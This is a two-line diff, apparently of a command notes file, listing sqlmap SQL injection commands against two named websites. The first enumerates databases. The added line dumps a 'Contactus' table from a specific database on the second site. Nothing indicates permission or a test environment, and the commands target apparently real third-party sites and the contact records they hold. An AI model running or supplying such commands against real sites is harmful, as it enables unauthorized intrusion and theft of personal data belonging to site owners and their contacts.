@@ -1,1 +1,2 @@
 python sqlmap.py -u "www.cowinbio.com/about/index.php?id=1*" --dbs --random-agent
+python sqlmap.py -u "http://www.denwell.com/locations.php?ID=1" -D denwellc_web -T Contactus --dump  --random-agent
